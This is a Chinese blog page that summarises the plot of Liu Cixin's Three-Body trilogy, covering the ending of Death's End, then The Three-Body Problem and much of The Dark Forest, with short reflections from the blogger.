<p>​        有一天，关一帆发现，临近的另一颗灰色行星上有飞船的踪迹。关一帆要去前往查看，程心要跟着，因为她想这可能和云天明有关。AA留在蓝星等着他们回来。二人乘坐关一帆的亨利号，前往灰星。在飞船上，关一帆高速程心，宇宙中最可怕的武器就是，宇宙规律。二向箔就是其中之一。二向箔在高等文明那很常用，它一旦展开就会无限扩张，所以，总有一天，整个宇宙也会二维化。宇宙正在死去，一些大神级文明，他们已经在研究，如何将自己二维化后，能继续活在二维世界里。大概在一百多亿年前，宇宙起码有十维。经过不断地星际战争，宇宙才变成先进的三维。有一批大神级文明，他们在努力使宇宙重启。</p>
<p>​        航行了几天，飞船抵达了灰星，在那里，他们没有找到云天明，而是看见了高等外星文明留下的死线。死线极其的黑，任何东西进去，都出不来，连光也一样。死线随时会破裂，破裂后的死线会形成低光速带，成为黑域。在这片区域里，光会变得非常慢。关一帆看到这一场景，连忙带着程心飞回蓝星，在返回的过程中，亨利号收到了AA的通讯，AA激动地告诉程心，云天明来了，现在就在蓝星上，我去找他过来和你说话。为了保证通讯安全，不被周围的外星人发现。不用了，我们马上就回去，随机关掉了通讯。正当程心他们要回到蓝星时，突然死线破裂，他俩进入了时间真空。十六天后，程心和关一帆，才脱离了黑域，回到了蓝星。在时间真空里虽然只过了16天，但此时，蓝星上已经过了一千八百九十万年。</p>
<p>​        程心很难过。因为她永远错过了云天明。二人用探测器发现了刻在石头上巨大无比的几个字，上面写着，我们度过了幸福的一生。我们送给你们一个小宇宙，在里面躲过坍缩，去新的世界。</p>
<p>​        他们发现了这个小礼物，这是一个由微亮细线画出来的门，两人牵着手，一同进入了这扇门。这里是一个一立方千米的循环空间，如果你从头跑到尾，你会发现，自己又回到了起点。在这个空间里，有一片美丽的田园。生活用品，一应俱全。这篇小天地就是云天明送给程心的第二件礼物，一个小宇宙。程心在这里看见了老朋友，智子。她用的躯壳还是跟地球上的外形一样。智子，是这里的管家，智子对程心说，宇宙很大，生活更大，我们真的又相会了。</p>
<p>​        智子告诉他们，这里是云天明送给二位的礼物，在这，时间会过得非常慢，只需在这待上十年，外面的宇宙，就会重启。程心和关一帆在这开始了甜蜜的生活，智子成为了他俩的老师。教他们三体里的知识，生活了许久后，他们收到了一个大神级文明向全宇宙广播的信号，这个信号包含了百万种语言，都是大神级文明，认为值得被通知的外星文明。在这信息中，他们发现了人类和三体人的语言。内容大致如下，请把你们制造的小宇宙归还到大宇宙中，大宇宙因为你们偷走的质量，将会在膨胀中死去。归还小宇宙，意味着在里面的居住者要回到大宇宙中。程心和关一帆决定归还小宇宙返回大宇宙中。</p>
<p>​        智子开始负责归还小宇宙，在这个小宇宙的底下，藏有一艘小型飞船，这艘飞船浓缩了三体世界最先进的技术。程心没有把这个小宇宙全部归还，她在这留下了五公斤。留下了一个生态球，里面养着小鱼。她希望，这个空间里还能有生命存在。智子对两位朋友说到，放心，我在，你们就在。随后，飞船启动，飞向了未知的大宇宙。</p>
<p>​        三体系列的整个故事，到此结束了。程心这一辈子，都在攀登一道责任的阶梯，小时候的她责任是好好学习，不让爸妈失望，努力成为一个优秀的人。长大后，她要为工作负责，为阶梯计划负责。后来云天明送个她的一颗星星。促使她成为了执剑人，这时的她要为全人类负责。后来她的责任变得复杂起来，本来她想给人插上光速飞行的翅膀，却不得不制止。最后她要为整个宇宙负责，归还属于自己的小宇宙。</p>
<p>​        人类，在面对即将到来的黑暗森林打击时，由于受到道德枷锁的限制，错出了很多决策失误，导致太阳系不复存在。只有程心与AA从太阳系逃出。三体系列的整个故事，告诉了我们一个整理。在浩瀚的宇宙中，永恒的只有死神。</p>
<h2 id="原视频链接"><a href="#原视频链接" class="headerlink" title="原视频链接:"></a>原视频链接:</h2><p><a href="https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080" target="_blank" rel="noopener">https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/08/02/Three_body/">
                三体
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-08-02</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    <img src="%E4%B8%89%E4%BD%93/1564721017718.png" alt="1564721017718"></p>
<p>这个暑假，读了三体一书。</p>
<p>​    粗浅的用一句话概括三体这套书，三体人想要侵略地球，人类跟他丫死磕。</p>
<p>​    故事情节跌宕起伏，勾人心弦，但三体令人着迷的地方，不单单只是因为他有一个好故事，更吸引人的地方，是他还拥有发人深思的魔力。</p>
<h3 id="三体-1"><a href="#三体-1" class="headerlink" title="三体"></a>三体</h3><p>​        故事是由三体人和人类中两个默默无闻的人引发的。分别是三体人1379号和地球人叶文洁。故事先从三体人的基本情况说起。三体人居中在距离地球4.3光年外，和人类是非常近的邻居。他们居住的星球非常坑，因为引力作用，三体星球会被拉来拉去，这会导致，这颗星球有时候特别冷，有时候特别热。只有在距离刚刚好的时候，三体文明才会蓬勃发展。还有一种极端的情况，这颗星球会被三体的引力撕裂，那么三体文明就彻底结束了。三体人所面临的问题，便是数学上非常经典的三体问题，小说名字也是由此而来。因为三体问题，三体人没有办法对未来进行准确的预测。像咱们人类都习惯了第二天早上太阳会升起来，但三体人可就没那么好命，第二天太阳是否会升起来，哪个三体人都不知道。在这种环境下，三体人还进化出了一种脱水的能力，以便在恶劣的环境中休眠，正所谓生于忧患而死于安乐，三体人疯狂的发展科技，想找到一个靠谱的星球，就像地球那样，可以在那里生活，因此三体人投入了大量的人力物力，天天仔细监听宇宙里的各种信号，不想放过一丝能找到新家园的机会。</p>
<p>​        接下来是叶文洁，就是她把三体人引过来的。叶文洁是一对中国科学家夫妻的女儿，小日子过得很幸福。但她的父亲在文革期间由于不愿意说谎认罪，被四个都是中学生的女红卫兵，用武装皮带当众抽打致死；母亲在文革中也疯了。后来叶文洁加入了建设兵团，她亲眼目睹了这群人的疯狂，山林草原都变成了荒漠。在这个过程中，他认识了一位记者，白沐林，二人成为了知己。后来这位知己想要给中央寄一封信，反映建设兵团不是在建设而是在毁坏环境。叶文洁看了信后大加赞赏，整封信内容丰富，逻辑缜密，令他信服，但这个记者长期干重活，导致手抖的厉害，于是叶文洁就帮知己重新抄了一遍，后来上级追查了下来，认为这是反动的行径。于是乎这位知己便出卖了叶文洁，说自己并不知道信的内容，这一下全部的责任都推给了叶文洁，叶文洁被关进了看守所，在看守所她拒绝签字陷害她的父亲，受到了变本加厉的迫害，这一切的丑恶让她心中的反人类种子长成了参天大树。对人类彻底的绝望了。后来叶文洁父亲的学生杨伟宁得知此事后，通过让她参与红岸基地的红岸计划救出了叶文洁。</p>
<p>​        红岸计划的主要目的是寻找外星人，以求科技飞跃，这个计划需要的人才极其苛刻，不过叶文洁的条件正好符合，但加入的代价是永远留在基地，与世隔绝。绝望的叶文洁还不犹豫地答应了。几年后，叶文洁和这位父亲的学生，自己的恩人，杨伟宁组建了家庭，生了一个女儿，杨冬。</p>
<p>​        工作期间，聪明的叶文洁利用太阳强化天线功率，向太空发出了地球的第一封信，里面包含着地球文明的基本信息。这个信号，可是三体人做梦都在找的，收到叶文洁信号的是那个叫1379号的三体人。三体的文明是高度集权的，处于极端的专制中，对个体的尊重几乎不尊重。有多不尊重呢？不能工作的人，就得死。毕竟在这种星球环境下，集权才能快速发展三体的文明。1379号孤独地生活了大半辈子，1379号所在的监听站，已经有上千年的历史了。这里只有他一个人，他每天都在一个小房子里，作者监听宇宙信号这种无聊底层的工作。在三体世界里，这是一个卑微的职业，处在社会的最底层，没有人注意他，更悲催的是，他一辈子什么也没听到。命运总是不期而遇，1379号收到了叶文洁的信号，他看到信息时非常感动，毕竟他等了一辈子，他通过自译解系统，看懂了叶文洁发来的信息，他发现这个遥远的星球，就是自己梦中的天堂，全三体人心中理想的家园。他不想把这一消息通知上级，他知道这意味着地球会被侵略，而且即便三体人成功占领地球，也和他没关系，并且一旦他完成任务，他将很有可能失去在社会中存在的价值，也就是说1379的成功，不会改变他孤独而卑微的生活，说不定还会更糟。渐渐地他爱上了这颗遥远的美丽星球，于是他给叶文洁回复了这么一段信息，不要回答，不要回答，不要回答。后面还有一段信息，大致内容如下：我是一个和平主义者，我不知道你是谁，在你的信号来源的方向，是有无数颗行星的。我们无法确定你们的位置，但只要你回复，我们一定会找到你们，我们一定会侵略地球。这一条信息，相当于把三体人千年等一回的机会给放弃了。这条信息一发出去，1379马上就给抓住了，由于1379已经很老了，元首给了他自由，想让他活到地球失去一切希望的那一天，让它美美梦破裂，这叫杀人诛心。与此同时，元首下令，处死与此相关的其余六千位三体人。</p>
<p>​        叶文洁收到外星人的回复后，惊讶不已，心跳加速，已经无法冷静思考的她，她认为人类已经没希望了，所以他想通过三体人这个外力，来帮助人类。便回复了：来吧来帮助我们吧，来侵略我们吧，我来帮你们获得地球。不久后，叶文洁的上级发现了哪里不对，知道了他是在和外星人联系。当那位上级去悬崖下面检查仪器的时候，叶文洁为了保证秘密不被泄露，冷静淡定的锯断了绳索，导致领导坠崖身亡，捎带着把自己老公也杀了。后来这个坠崖事件，被当做普通的工作事故处理了，没人对叶文洁起疑心。锯断绳子的那一刻，叶文洁就已经下定决心，从今儿起，老娘就要把革命的事业进行到底。</p>
<p>​        三体人那边，1379刚捣乱就被抓了，但叶文洁回复时却没人知道。她就在这种没人直接干预的情况下，为全人类也做了个要命的决定。叶文洁这条信息，飞了四年到达了三体星球，三体人对这突如其来的幸运，感到无比幸福。毕竟地球离得这么近，于是三体人把所有资源都用在了造飞船上，之后三体人联系上叶文洁，请她做好接应工作，这一部分就是整个故事的开端。</p>
<p>​        1379和叶文洁这两个无名小卒，一个差点让三体人对生存的机会失之交臂，而另一个给全人类带来了几百年的噩梦，在以前信息闭塞的时代，没有权势的无名小卒，是不可能影响整个世界文明的。但如今这俩人聊着天，就把各自星球的文明，翻来覆去改变了两次。这里警示了我们，让外星人知道我们在哪，是一件特别不着调的事。霍金在之前也说了几乎一样的观点，千万别跟外星人瞎联系。</p>
<p>​        文革过去了，叶文洁终于得以平反，走出了深山，并且可以回到母校任教。由于资历深，叶文洁被选中去负责发射基地的选址项目。她在西北地区认识了一个热爱大自然的国外富二代伊文思，伊文思也是后来在地球接应三体人真正负责人。他虽然富甲一方，但他依然改变不了人们对地球环境的破坏，他一样期望着通过外星人的力量来帮助人类，于是伊文思和叶文洁决定携手共创辉煌，两人成为了地球上三体组织的创始人。他们相互表达敬意，伊文思说出了以后，地球三体组织接纳新成员时必说的一句话，我们是同志了。</p>
<p>​        多年过后伊文思在秘密地在一艘巨轮上，创立了第二红岸基地，在巨轮上建立是为了方便移动便于隐藏。根据叶文洁提供的信息，伊文思与三体人建立了通讯，这里的人将叶文洁称之为最高统帅，这个反人类的组织，目的很明确，消灭人类暴政，世界属于三体。</p>
<p>​        三体人派出了一种叫智子的东西，来封锁地球的基础科学。智子是一个超级微型机器人，它非常的小，可以被加速到接近光速，只要四年多的时间，它就可以从三体行星达到地球。三体人对微观世界的研究远超人类，智子的制造原理非常晦涩难懂，三体的科学家先把复合粒子中的质子展开成二维，然后在质子宏达的二维展开面上，搭建集成电路，制造好后，再把它收缩回普通质子的大小，这样，这个微观粒子，就变成了超级智能计算机。由于智子的捣乱，国际知名组织，科学边界里很多杰出的科学家纷纷自杀，可见三体人把人类科学家逼成什么样了。经政府机构邀请，一位五大三粗，一脸横肉不修边幅的史强警察，和一名研究纳米材料的汪淼教授，开始调查此事。自杀名单中，还包括了叶文洁的女儿杨冬，家人发现了她服用了大量安眠药，死在了床上。杨冬的男友丁仪，给汪淼他们看了杨冬的遗书。遗书很简短也没签字，内容如下，物理学从来就没有存在过。将来也不会存在。我知道自己这样做是不负责任的，但别无选择。史强和汪淼这俩人，一开始像磁铁的两个正极一样合不来，但在后来的合作中，两人产生了感情。正在调查的汪淼，眼前突然出现了一组消散不去，正在倒计时的数字，这组幽灵倒计时可把汪淼折腾惨了，当他暂停了工作，去探求真相后倒计时消失了。汪淼通过射电望远镜，发现了宇宙辐射背景下的倒计时，他相信一定有某种神奇的力量，限制着人类科学。这其实也是智子搞的鬼。它不仅能限制人类的微观研究，还能展开成二维，干扰人类的宏观研究。经过深入的调查，汪淼他们发现了一款名叫三体的游戏。这游戏非常真实，其内容都是尽量还原三体人的生活环境，几经波折后，汪淼通关了游戏，收到了参加三体玩家线下聚会的消息。负责人询问各位玩家，是否同意三体人降临地球，汪淼假装同意，打入了敌人内部，进入组织内部的汪淼惊讶发现，这个组织的精神领袖，正式杨冬年迈的母亲叶文洁。不久之后，史强汪淼里应外合把地球叛军这个组织拿下了，叶文洁被活捉，随后大家便知道了第二红岸基地这艘邮轮的存在。面对这帮叛徒，干掉他们是其次的，最重要的是，获得他们与三体人的聊天记录。毕竟从聊天记录里，能掌握大量的地方情报，也能知道对手的要害在哪。</p>
<p>​        人们为了拿到这份聊天记录，费了千辛万苦，首先上船抓是不靠谱的，这帮人都是亡命徒，随时可能跟数据资料同归于尽，也不能对这艘船进行军事打击，万一炸了，那就功亏一篑了。在审问中人们得知了一个千载难逢的好机会，这艘船会在某一天经过巴拿马运河。这个运河最窄的地方就150米，史强想了个法子，在河的两边架起两根高高的杆子，在杆子上拉起了超韧性的纳米级细丝，每隔50cm拉一根，这些看不见的细丝，锋利无比。如果这艘船穿过这个纳米细丝组成的墙，船和人都会像切豆腐一样被切开，船上的任何人都来不及任何应急措施。当然，用来储存各种数据的硬盘，也会被切开，不过会被切的很平整，是可以还原的。这次行动被称为古筝计划。古筝计划非常成功，这艘船像一叠扑克牌一样，刷的一下就分开了，变成了千层糕，船被切成了50厘米的薄片，伊文思也被切成了三段。人们在船的废墟里，找到了想要的资料，一共有28个G，人们仔细研究了这些资料，得到了两个非常重要的情报。</p>
<p>​        一个大的坏消息是，智子除了封锁人类科技发展，它还是个超级监视器，它利用自己的光速移动能力监视所有人，干扰各别科学家的视神经，每一个人类说的每一句话，做的每一件事，三体人都在全程看直播。如此重要的情报，让人类知道任何开会讨论出来的计划，都会被三体人知道。古筝计划的成功，其实是三体人为了借人类的手，消灭这帮地球叛军的计划。因为三体人的思想是透明的，他们通过思维直接交流，不会撒谎，当他们得知人类有撒谎这个技能后，非常的恐惧。人类在得知有智子这个东西后，智子就不能再干扰人类的宏观观测了，因为它一旦在展开成二维，就很可能被人类消灭。之前汪淼和一些科学家眼前的幽灵倒计时，就是指在在人视网膜上搞的把戏。第二个情报是，在地球上三体人怕一个人类，而且只怕这一个人，地球叛军曾经多次想要杀死他，这个人，就是罗辑。</p>
<p>​        这个故事告诉我们，如果发现组织里有叛徒，最关键的不是消灭它，而是获取敌方高价值的信息，如果叛徒这个棋子用的好，你会比敌人更有利。</p>
<p>​        后来人类所发展的所有战略， 都是基于这两个信息：地球上有个叫智子的机器人在捣乱，和三体想杀一个叫罗辑的男人。人们紧急召开了国际会议，讨论如何应对危机，此时三体人通过智子，给每个人眼前显示出了相同的文字，你们是虫子。</p>
<p>​        当全世界的人得知此消息后，便开始陷入了绝望，汪淼在得知整个事情的来龙去脉后，和杨冬的男友丁仪借酒消愁。两位科学家感叹着人类在三体人眼里就是虫子，还是即将灭绝的虫子，他们耍着酒疯大喊道，末日万岁，虫子王万岁，智子万岁。史强看到后为了给他们大气，让他们振作，把俩人带到了一片麦地，他们注视着麦田，蝗虫在这片麦地漫天飞舞，像沙尘暴啃食着庄稼，两人看到这一幕心有所想，人类与蝗虫科技之间的差距，比人类和三体人之间大多了。我们用飞机喷洒各种杀虫剂，培育他们的天敌，无所不用其极地想消灭他们，但他们翱翔于天地之间，没有被灭绝。把人类看成虫子的三体，似乎忘记了一个事实，虫子虽然很弱小，但从来没有被真正消灭过，三人沐浴在这生命的暴雨中，感受着地球生命的尊严。汪淼和丁仪把手中拎这的酒慢慢洒在脚下，他们说，这，是敬虫子的。</p>
<h3 id="黑暗森林"><a href="#黑暗森林" class="headerlink" title="黑暗森林"></a>黑暗森林</h3><p>​        书的开篇借用一只褐蚁，在叶文洁女儿杨冬的墓碑上爬行，引出了一段往事。上本书的主角叶文洁和新主角罗辑，在叶文洁的女儿杨冬墓前见面，新主角罗辑是杨冬的高中同学，很聪明，但胸无大志，以前是搞天文学的，犹豫不好混现在改行教社会学。叶文洁给出了一条建议，让他把这两个专业结合，做出，宇宙社会学。并给出了两条宇宙社会学的公理：第一，生存是文明的第一需要；第二，文明不断增长和扩张，但宇宙的物质总量保持不变。和两个重要概念，猜疑链和技术爆炸。说完这些，叶文洁便匆匆的离开了。离别时自言自语道，我尽了责任。</p>
<p>​        时光荏苒，多年过后，人类已经知道三体在400年后即将降临，世界各国政府进入了备战状态，准备齐心合力保卫家园。由此开始了，危机纪元。世界上正发生着这几件大事，第一件，规划组件太空军。在这支太空军里，有一位主角，章北海，他是军人世家。在外人眼里，他坚信人类必胜，收到组织高度重视。后来太空军选出了一批信仰坚定的军人冬眠，去增援末日之战，其中就包括他。第二件，全球技术公有化，联合国逐渐成为世界政府，国家的边界开始模糊，地球上出现了逃亡主义，他们认为，地球科技已被锁死，走出太阳系，寻找新家园才能延续下去。但毕竟资源有限，大多数人要留在地球上。不久之后，人人平等的口号响彻地球，联合国一致决定，要死一起死，坚决反对逃亡主义。一时间，保卫家园，绝不逃离，成为了世界的主旋路以及政治正确。</p>
<p>​        画面一转，罗辑这位花花公子，和一位女伴刚从宾馆出来，突然一辆疾驰的车向他们撞来，恰好被消防栓绊倒的罗辑，侥幸逃过一劫。但女伴却被当场撞死。罗辑以为这是意外，他不知道这是三体人给地球叛军下达的暗杀命令。不明真相的罗辑被警务人员带进了一个地下十层的小房子里，在这，他与上本书中的史强相识了。随后，罗辑被大批武装部队护送上了飞机，在多架歼击机的护航以及数名保镖的护送下，罗辑安全抵达了联合国会场，这突如其来的大场面，换在谁身上都得蒙圈。大会上联合国秘书长，宣布了面壁者计划。面壁计划是基于这两个主要情报产生的：一、地球在三体人那已经完全透明了，任何交流、会议都变成了现场直播；二、三体人的弱点在于不懂说谎，在他们的世界里没有阴谋、暗算这些词。面壁计划的核心在于，选出四个战略计划的制定者和领导者，他们完全按照自己的思维制定计划，不与外界交流，计划真正的目的和意图都藏于他们的大脑。他们所表现出来的行为应该是欺骗敌人。这四人被称之为，面壁人。面壁人拥有最高权力去调集地球资源，简而言之就是在世界上选出四个有能力的大骗子，去骗三体人。</p>
<p>​        秘书长公布了面壁者名单。第一位面壁者是刚刚卸任的美国国防部部长，泰勒；第二位是委内瑞拉现任总统，雷迪亚兹；第三位是世界知名脑科学家，希恩斯；第四位是，罗辑。罗辑听到自己名字后差点晕过去。各国领导人，和世界知名人物，齐刷刷地盯着他。罗辑被搀扶到了主席台上。大脑一片空白的罗辑在散会后才回过神，他认为这是搞错了，不断地向所有人拒绝自己面壁人的身份。而所有人都以为，他，已经开始演戏了。</p>
<p>​        当他一人冲出大会后，又遭到了暗杀，被狙击手一枪撂倒。好在他一路上都穿着防弹衣，这之后罗辑一直被保护着，慢慢地，罗辑也想通了。既然自己没法辞职，不如利用特权好好享受人。正当其他面壁者殚精竭虑，绞尽脑汁，准备大干一场时，罗辑的要求在联合国眼里非常奇特， 他先要了个依山傍水，被自然拥抱的山庄，去那开始享受社会文雅的贵族生活。随后，他只要说一句，这是面壁者计划的一部分，他所有花花公子的欲望都会被满足。而事实上，那些世界领导人觉得，罗辑干得很好，不仅让人捉摸不透，还比其他三位花钱少。</p>
<p>​        三体人通过智子，从残余的地球叛军中，选中了三个人，去破解面壁人的计划。这三位被称之为，破壁人。罗辑没有破壁人，因为三体人知道，只要罗辑他自己想不明白，他就是自己的破壁人。其他的三位面壁人，有人在研究核弹，有的在研究军队，有的在研究脑科学。而罗辑在干嘛呢？他在泡妞。</p>
<p>​        他把史强找来，让史强去安装自己的描述，找到他梦中的女神，史强很快找到这个人，她的名字叫，庄颜。是中央美院国画系刚毕业的大学生，史强很简单的就把她忽悠来了，她对庄颜说，世界需要你，面壁者需要你。当罗辑看见自己梦中的女神，活生生地站在面前时，整个人都傻了，他对庄颜说，你的工作是，使自己快乐，成为世界上最幸福最快乐的女孩。这是面壁计划的一部分。</p>
<p>​        不久后，罗辑带着庄颜，去了他最想去的卢浮宫。在蒙娜丽莎的微笑面前，两人坠入爱河，这位纯洁的小女生，成为了罗辑的妻子，从此开始了幸福的生活。史强在之前抓捕地球叛军的行动中，收到了辐射影响身患白血病，现代的医疗手段无能为力，在完成罗辑交代的这个任务后，他进入了冬眠。希望未来的医疗水平能救他一命。</p>
<p>​        五年后，第一个被破壁的面壁人是前美国国防部长，泰勒。破壁人以粉丝的身份走入他的家中，揭穿了他的目的。说道，你表面上是想建立一支太空神风敢死队，跟三体人死磕。其实，你的这批部队，会装备一种叫球状闪电的武器，被它打死的人会变成幽灵态，在开展前夕，你会让他们去偷袭地球军队，把自己人打成量子态的幽灵部队，让他们去死磕三体人，在破壁人揭穿泰勒的计谋后，来了一句神补刀。即便您成功了，主也不在乎。</p>
<p>​        破壁人将自己的成果发到网上，随后舆论哗然，大家接受不了泰勒杀死自己的人的计划，失落的泰勒，在罗辑别墅的周围，饮弹自尽。</p>
<p>​        从此人们对面壁者产生了越来越多的质疑，罗辑的好日子也到头了。世界政府秘密地将他的妻子和孩子冬眠送到未来，强迫罗辑做点什么，毕竟他是三体人唯一要暗杀的人类。苦思冥想的罗辑，走在已经被冻结的湖面上。哗啦一声，冰面裂开，罗辑掉入了湖里，在漆黑冰冷的湖水里，他终于明白当初叶文洁对他说的那番话是什么意思了。好在罗辑身体素质还行，不然差点就淹死了。 </p>
<p>​        悟出真想的罗辑，赶紧动用特权，把他护送到一个及其安全的地下室，在这里，罗辑通过自己的权利，向宇宙发射了一个恒星的坐标，这件事被后人戏称为，逻辑的咒语。由于咒语很久后才能生效，所以罗辑告诉医务人员，把他送去冬眠，等那颗恒星爆炸后，再唤醒他。但很快，他就在一次遭到了暗杀，这一次使用的是基因武器，针对目标进行病毒感染，现在的医疗手段对它毫无抵抗能力，罗辑立刻被医疗人员强行冬眠，希望在未来，能有医疗手段治疗他。</p>
<p>​        八年后，面壁者雷迪亚兹和希恩斯从冬眠中被唤醒，他们被告知，技术已经成熟到他们的预期了，脑科学家希恩斯得到超级计算机。不久之后，他和妻子造出了思想钢印，思想钢印可以在人脑中输入任何信息，并让这个人坚信不疑。比如，在受印者脑中输入水是有毒的，渐渐地他就再也不敢喝水了，这台机器的主要用途在于给人类太空军的思维打上人类必胜的信念。</p>
<p>​        核弹狂人雷迪亚兹得到了3.5亿吨的恒行型氢弹，紧随其后的是，他的破壁人出现，破壁人说道，你想造一百万可恒星氢弹放在水星上，主要的目的不是防御地球，而是为了引爆水星。把水星推进太阳里，从而让地球，火星，金星脱离轨道坠入太阳，与抵达的三体人同归于尽，毁灭三体人想得到的东西。这位破壁人在最后同样来了一句神补刀，你的计划，主不在乎。因为以地球的资源，根本造不出一百万颗恒星氢弹，即便造出来了，以远远不够把水星炸到脱离轨道。</p>
<p>​        破壁人先前也把资料上传到网上，舆论再次哗然，大家接受不了这种疯狂的举动。在之后的听证会上，雷迪亚兹的面壁者身份被终止，在准备抓捕雷迪亚兹时，他撒谎说自己的手环上是摇篮系统， 只要自己有生命危险，手环上的信号就会中断，从而引爆纽约市的氢弹，如果纽约市的氢弹被触碰也会爆炸，雷迪亚兹成功逃脱，在回国的路上，大家才知道这个摇篮系统不过是他为了脱身的幌子。</p>
<p>​        回国后，这位以往被国民认为是大英雄的前总统 并没有迎来鲜花和掌声，而是无数的石头，雷迪亚兹当场被无数的石头，砸死。</p>
<p>​        一百八十五年后，罗辑从冬眠中被叫醒，他发现周围的人充满自信，在这个时代，人们的基因渐渐进化，到处都是帅哥美女，人类掌握了两个技术，可控核聚变，这项技术的出现，彻底解决了人类的能源问题，石油能源被淘汰了。在这个时代已经没有省电省水的概念了，所有的电器都不再使用电池。另一项是，基因改造技术，彻底解决了粮食问题。</p>
<p>​        现在人们造出了两千艘太空战舰，飞船能达到光速的百分之十五，比三体人的飞船快多了。面壁计划很早就被废止了，罗辑当年向太空发送的咒语，被当成了笑话。为了准备与三体人作战，人们在一千米以下建立了城市，大多数人生活在地下，少部分人生活在地面上，主流语言变成了英语一汉语的杂糅语言，希望三体人占领地球的叛军组织，早在一个世纪前就被消灭了。之前人类经历的大低谷，那时候世界格局紧张异常，人人都处在备战状态，低落的情绪下，人们自暴自弃，经济开始大滑坡，环境开始恶化，全世界都发生了饥荒。人吃人成了常态，人口急剧下降，后来越来越多人逐渐想明白，既然灾难一定要来临，痛苦的一天也是一天，开心的一天也是一天，于是他们站出来引导大家，振臂高呼，给岁月以文明，而不是给文明以岁月。</p>
<p>​        随即人类的复兴运动兴起，文明加速进步，罗辑从冬眠中恢复了不少后，参加了最后一次面壁者远程听证会。在会上，他看到了已经苏醒的希恩斯和他的妻子助手，听证会像他们宣布了，面壁者计划被终止，所有面壁者恢复普通人的身份，希恩斯的亲子在大会上，对丈夫说道，我是你的破壁人。你所制造的思想钢印，给每个人打上的思想前面都加了负号，也就是说这些人，坚信的是人类必败，你是想培养出一批逃亡主义者，逃出地球。</p>
<p>​        会上的人无不惊讶，太空军开始调查这批被打上人类必败信仰的钢印族，散会后不久，这位面壁者的妻子，就切腹自尽了。而面壁者希恩斯并没有得到制裁。会后，罗辑碰上了老朋友史强，没多久，罗辑就再次遭到了暗杀，第一次差点被无人汽车撞死，第二次差点坠落身亡，第三次差点被机器人服务员捅死，第四次差点被毒死，第五次差点被只能沙发勒死，这次暗杀他的，是叫做killer的暗杀病毒，好在一向警觉敏锐的史强在他身边救了他。随后，他们为了躲避电脑追杀，离开了地下城市，去了地表。</p>
<p>​        另一边的增援未来的指挥官们被唤醒，由于钢印族隐藏得很深，所以这批被唤醒的军官，被任命为执行舰长，其中就包括章北海。章北海登上了自然选择号，舰长是一位漂亮的女生，名叫东方延续，他给了章北海一把手枪，说，如果发现我有失败注意的想法，可用它杀了我。结果指挥权的章北海立刻做出了让所有人都意料不到的举动，它通过各种指令，劫持自然选择号上的2000名船员，跑路了。</p>
<p>​        其实他一直都是一名伪装很好的失败主义者，他坚信人类必败，舰队司令部的司令们都懵了，这是什么状况？司令官们反映了半天才回过神来派出追击舰队。另一边，世界政府开始商讨如何安置即将被人类打败的三体人。与此同时，人类观测到，三体舰队派出了一个小型探测器，已经进入了太阳系。国际舰队决定，派出全部两千零十五艘恒星级战舰，拦截三体探测器，以显示地球的雄威。</p>
<p>​        此时地球上所有的媒体都在直播这一盛况，几乎所有人都激动地守在屏目前，有的发出兴奋的尖叫，有的感动得嚎啕大哭，无人不为自己文明而自豪，各地开始了接连不断的狂欢，舰队紧密的排成了100X20的长方形矩阵，一起去迎接。83岁的丁仪已经是这个时代最德高望重的科学家了，他被选中作为第一个接触三体小型探测器的人。先头飞船捕获了这枚探测器，这枚探测器外表像极了一滴水，它的表明光滑无比，如同明镜。于是人们给了她一个称呼，水滴。</p>
<p>​        谨慎的丁仪在接触水滴前，令他所在的量子号飞船，随时准备以最高速度跑路，同时临近的青铜时代号已经入了准备状态。水滴被成功捕获，这一画面传到了地球。几乎所有的人都在欢呼雀跃，热泪盈眶。丁仪博士上千仔细观看，他发现水滴的表面及其光滑，当他用显微镜看水滴表面时，他吓坏了。无论是放大一百倍，还是一千倍，一万倍，一百万倍，一千万倍。水滴的表面还是光滑无比，像镜面一样。这意味着，改物体密度极其的大，无比的坚硬，它可以轻易的横穿地球，且不会有丝毫损伤，就像子弹穿过奶酪。人们现在所能造出最光滑的东西，放大个几百倍，就可以看到粗糙的像重重山峰的纹理。惊讶无比的丁仪博士缓缓回过神来，自言自语道，毁灭你，与你何干。随后丁仪大喊一声，傻孩子们快逃啊。但一切都太晚了。</p>
<p>​        水滴干扰了信号，随后尾巴开始出现蓝色的光环，不断加速，捕获他的飞船瞬间汽化，随后它以全速精准地撞向，第一排第一列第一艘战舰的燃料舱。由于这些战舰用的都是核聚变燃料，燃料舱一炸就直接玩完，可见三体人对人类战舰的弱点了如指掌。它向石子划过空气一样穿过一艘又一艘战舰，整整齐齐的战舰像鞭炮一样，在太空中不断炸开了花。水滴仅仅用了1分28秒就贯穿了第一队列的一百艘战舰。由于水滴太小，人们对雷达根本检测不到，后排的舰队完全不知道怎么回事，就看见这眼前焰火表演。</p>
<p>​        水滴此时做出了一个不可思议的锐角急转，丝毫没有减速的撞向第二队列的飞船，后来科学家看到这段影像，都傻了。水滴的攻击方式，非常的原始，就是用头撞。当第三排战舰也炸完后，舰队开始散开准备逃跑。虽然他们不知道怎么了，但这样炸下去，不得不跑。</p>
<p>​        在散开的过程中虽然有战舰发现了水滴，并进行反击，但炮弹打到水滴上，丝毫没有反应。只是让他稍微减速了一下。水滴就像一枚死神的绣花针，以最短的路程，来回穿梭在战舰之间。正常战舰只有五十分钟，人类所有的骄傲与荣光。就被一枚小小的探测器，顷刻覆灭。</p>
<p>​        毁灭你，与你何干。这个故事可以看出，两个科技间存在巨大差距的文明，是不可能打的有来有往的。</p>
<p>​        这场战斗，只有两艘战舰逃离了战场，他们分别是青铜号和量子号。与他们不同方向的正在逃亡的自然选择号，以及追击它的四艘战舰。蓝色空间号，企业号，深空号，终极规律号，也幸存了下来。</p>
